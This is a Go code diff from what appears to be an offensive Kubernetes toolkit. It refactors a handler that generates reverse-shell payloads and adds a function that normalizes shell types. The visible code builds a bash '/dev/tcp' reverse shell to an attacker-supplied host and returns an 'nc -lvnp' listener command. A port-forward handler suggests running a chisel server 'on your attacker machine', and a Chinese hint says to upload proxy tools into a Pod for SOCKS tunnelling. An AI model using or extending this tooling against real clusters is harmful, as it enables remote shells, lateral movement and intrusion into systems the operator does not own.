@@ -311,7 +311,9 @@ func (h *ExecHandler) CheckRBAC(c *gin.Context) {
 		allowed := make([]string, 0)
 		for _, v := range verbs {
 			ok, _ := client.CheckSelfPermissions(ctx, "", v, r)
-			if ok { allowed = append(allowed, v) }
+			if ok {
+				allowed = append(allowed, v)
+			}
 		}
 		perms = append(perms, gin.H{"resource": r, "verbs": allowed})
 	}
@@ -330,9 +332,7 @@ func (h *ExecHandler) GenerateRevShell(c *gin.Context) {
 		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
 		return
 	}
-	if req.Type == "" {
-		req.Type = "bash-i"
-	}
+	req.Type = normalizeReverseShellType(req.Type)
 
 	payloads := map[string]string{
 		"bash-i":    fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", req.LHost, req.LPort),
@@ -348,16 +348,28 @@ func (h *ExecHandler) GenerateRevShell(c *gin.Context) {
 	}
 	payload, ok := payloads[req.Type]
 	if !ok {
+		req.Type = "bash-i"
 		payload = payloads["bash-i"]
 	}
 
 	listenerCmd := fmt.Sprintf("nc -lvnp %s", req.LPort)
 	c.JSON(http.StatusOK, gin.H{
-		"type":    req.Type,
-		"payload": payload,
-		"listener": listenerCmd,
+		"type":      req.Type,
+		"payload":   payload,
+		"listener":  listenerCmd,
 		"all_types": []string{"bash-i", "bash", "python", "perl", "nc-e", "nc-mkfifo", "php", "ruby", "lua", "curl"},
 	})
+}
+
+func normalizeReverseShellType(shellType string) string {
+	switch shellType {
+	case "", "default":
+		return "bash-i"
+	case "nc":
+		return "nc-mkfifo"
+	default:
+		return shellType
+	}
 }
 
 // ==================== File Upload to Pod (kubectl cp) ====================
@@ -434,10 +446,10 @@ func (h *ExecHandler) PortForwardInfo(c *gin.Context) {
 	}
 
 	c.JSON(http.StatusOK, gin.H{
-		"command": fmt.Sprintf("kubectl port-forward -n %s pod/%s %d:%d", req.Namespace, req.PodName, localPort, req.PodPort),
-		"namespace": req.Namespace,
-		"pod_name": req.PodName,
-		"pod_port": req.PodPort,
+		"command":              fmt.Sprintf("kubectl port-forward -n %s pod/%s %d:%d", req.Namespace, req.PodName, localPort, req.PodPort),
+		"namespace":            req.Namespace,
+		"pod_name":             req.PodName,
+		"pod_port":             req.PodPort,
 		"suggested_local_port": localPort,
 		"chisel_proxy": gin.H{
 			"server_cmd": fmt.Sprintf("# On your attacker machine:\n./chisel server -p 8080 --reverse"),
@@ -446,4 +458,3 @@ func (h *ExecHandler) PortForwardInfo(c *gin.Context) {
 		"hint": "使用 kubectl cp 将 chisel/frp 等代理工具上传到 Pod，然后通过端口转发建立 SOCKS 代理通道",
 	})
 }
-
